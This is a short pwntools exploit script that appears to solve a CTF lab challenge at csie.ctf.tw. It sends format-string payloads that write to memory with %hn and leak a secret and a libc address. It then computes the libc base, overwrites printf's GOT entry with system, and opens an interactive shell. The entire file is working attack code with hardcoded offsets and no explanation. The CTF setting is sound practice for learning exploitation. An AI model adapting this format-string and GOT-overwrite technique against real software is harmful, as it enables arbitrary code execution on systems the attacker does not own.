from pwn import *
# r = process('./lab-1')
r = remote('csie.ctf.tw','10129')
a = 0x6012ac
p = '%45068c%24$hn%19138c%25$hn%8$p.%9$p|%26$s|'.ljust(0x40,'\x00') + p64(a) + p64(a+2)+ p64(0x6011e0)
r.sendafter('name ?' , p)
_,_,s = r.recvline(), r.recvline() , r.recvline()
s = s[64206:]
secret , remain , _  = s.split('|')
secret_a,secret_b = int(secret.split('.')[0],16) , int(secret.split('.')[1],16)
r.send( p64(secret_a) + p64(secret_b))

libc_base = u64(remain.ljust(8,'\x00')) - 0x21ab0

printf_got = 0x601230
system_libc = libc_base + 0x4f440

first_two_bytes = system_libc & 0xff
next_four_bytes = ((system_libc & 0xffff00) >> 8) - first_two_bytes
p = b'%'+str(first_two_bytes).encode('utf-8')+b'c%13$hhn%'+str(next_four_bytes).encode('utf-8')+b'c%14$hn'
p = p.ljust(0x18,b'\x00')
p+=p64(printf_got)
p+=p64(printf_got+1)
r.send(p)
r.interactive()
'''